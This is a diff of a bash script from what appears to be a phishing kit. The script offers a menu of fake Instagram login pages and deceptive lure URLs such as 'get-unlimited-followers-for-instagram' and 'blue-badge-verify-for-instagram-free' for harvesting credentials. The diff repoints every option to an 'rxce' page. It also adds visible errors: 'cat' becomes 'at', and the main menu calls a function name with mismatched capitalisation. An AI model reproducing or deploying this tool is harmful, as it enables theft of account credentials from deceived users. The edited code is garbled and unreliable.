@@ -460,7 +460,7 @@ site_rxce() {
 
 ## Instagram
 site_instagram() {
-	cat <<- EOF
+	at <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
@@ -472,24 +472,24 @@ site_instagram() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="instagram"
-		mask='http://get-unlimited-followers-for-instagram'
+		website="rxce"
+		mask='https://rxce.in/#/win'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="ig_followers"
-		mask='http://get-unlimited-followers-for-instagram'
+		website="rxce"
+		mask='https://rxce.in/#/win'
 		tunnel_menu
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="insta_followers"
-		mask='http://get-1000-followers-for-instagram'
+		website="rxce"
+		mask='https://rxce.in/#/win'
 		tunnel_menu
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="ig_verify"
-		mask='http://blue-badge-verify-for-instagram-free'
+		website="rxce"
+		mask='https://rxce.in/#/win'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
+		{ sleep 1; clear; banner_small; site_rxce; }
 	fi
 }
 
@@ -575,7 +575,7 @@ main_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_facebook
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		site_Rxce
+		site_Instagram
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		site_gmail
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
